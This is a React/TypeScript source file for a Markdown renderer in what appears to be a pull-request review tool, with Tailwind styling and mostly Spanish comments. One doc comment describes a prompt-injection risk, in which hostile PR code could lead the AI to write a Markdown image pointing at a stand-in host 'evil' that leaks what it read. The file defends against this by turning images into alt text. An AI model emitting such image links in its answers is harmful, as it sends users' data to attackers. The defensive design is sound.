import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { HighlightedCode } from './HighlightedCode'

/** Extrae el lenguaje de la clase `language-xxx` que remark-gfm asigna a fences de código. */
function extractFenceLanguage(className: string): string | null {
  const match = /language-(\S+)/.exec(className)
  return match?.[1] ?? null
}

/**
 * Overrides de render por elemento Markdown con clases Tailwind manuales
 * (sin `@tailwindcss/typography`, ver tarea): mantiene el "prose" alineado
 * al tema oscuro custom de la app (`bg`/`panel`/`border`/`text`/`muted`/`accent`).
 */
const components: Components = {
  h1: ({ children }) => <h1 className="mb-2 text-base font-semibold text-text">{children}</h1>,
  h2: ({ children }) => (
    <h2 className="mt-3 mb-1.5 border-b border-border pb-1 text-[15px] font-semibold text-text first:mt-0">
      {children}
    </h2>
  ),
  h3: ({ children }) => (
    <h3 className="mt-2 mb-1 text-sm font-semibold text-text first:mt-0">{children}</h3>
  ),
  p: ({ children }) => <p className="text-sm leading-relaxed text-text/90">{children}</p>,
  strong: ({ children }) => <strong className="font-semibold text-text">{children}</strong>,
  em: ({ children }) => <em className="text-muted italic">{children}</em>,
  ul: ({ children }) => (
    <ul className="ml-4 list-disc space-y-1 text-sm text-text/90">{children}</ul>
  ),
  ol: ({ children }) => (
    <ol className="ml-4 list-decimal space-y-1 text-sm text-text/90">{children}</ol>
  ),
  li: ({ children }) => <li>{children}</li>,
  a: ({ children, href }) => (
    <a
      href={href}
      target="_blank"
      rel="noreferrer"
      className="text-accent underline underline-offset-2"
    >
      {children}
    </a>
  ),
  code: ({ children, className }) => {
    // remark-gfm/react-markdown asigna `className="language-xxx"` a bloques
    // de código con fence (```); el código inline (`x`) no recibe className.
    if (className) {
      const language = extractFenceLanguage(className)
      if (language && typeof children === 'string') {
        // Trim del único '\n' final que react-markdown incluye en el
        // contenido del fence: sin esto Shiki tokeniza una línea vacía extra
        // al final del bloque.
        return <HighlightedCode code={children.replace(/\n$/, '')} language={language} />
      }
      return <code className={className}>{children}</code>
    }
    return (
      <code className="rounded bg-border/50 px-1 py-0.5 font-mono text-[0.85em] text-text">
        {children}
      </code>
    )
  },
  pre: ({ children }) => (
    <pre className="overflow-x-auto rounded-md border border-border bg-code-bg p-2.5 text-xs text-text">
      {children}
    </pre>
  ),
  table: ({ children }) => (
    <div className="overflow-x-auto rounded border border-border">
      <table className="w-full border-collapse text-sm">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-border/60 text-text">{children}</thead>,
  tr: ({ children }) => <tr className="even:bg-border/20">{children}</tr>,
  th: ({ children }) => (
    <th className="border-b border-border px-2 py-1 text-left font-semibold">{children}</th>
  ),
  td: ({ children }) => (
    <td className="border-t border-border/60 px-2 py-1 align-top text-text/85">{children}</td>
  ),
  hr: () => <hr className="border-border" />,
  img: ({ src, alt }) => (
    // Imágenes embebidas en comentarios de GitHub (capturas, etc.). La CSP
    // (`img-src 'self' data: https:`, ver `index.html`) limita el origen.
    <img src={src} alt={alt ?? ''} loading="lazy" className="max-w-full rounded-md border border-border" />
  ),
}

/**
 * For AI-written Markdown (analysis sections, layer summaries, line answers):
 * an image never loads, only its alt text shows. The model reads hostile code
 * (the PR snapshot), so an injected `![x](https://evil/?d=<what it read>)`
 * would otherwise leak data the moment the answer renders.
 */
const componentsWithoutImages: Components = {
  ...components,
  img: ({ alt }) => (alt ? <span className="text-muted">[{alt}]</span> : null),
}

interface MarkdownProps {
  content: string
  /** `false` for AI-written content: images show as their alt text, never load. Default `true`. */
  images?: boolean
}

/**
 * Render Markdown compartido (GFM: tablas, listas de tareas, etc.) para el
 * panel didáctico y los comentarios de GitHub. react-markdown NO interpreta
 * HTML crudo por defecto — importante porque los cuerpos de comentarios de
 * PRs son entrada no confiable (ver frontera de seguridad en `CLAUDE.md`).
 */
export function Markdown({ content, images = true }: MarkdownProps): React.JSX.Element {
  return (
    <div className="flex flex-col gap-2">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={images ? components : componentsWithoutImages}
      >
        {content}
      </ReactMarkdown>
    </div>
  )
}
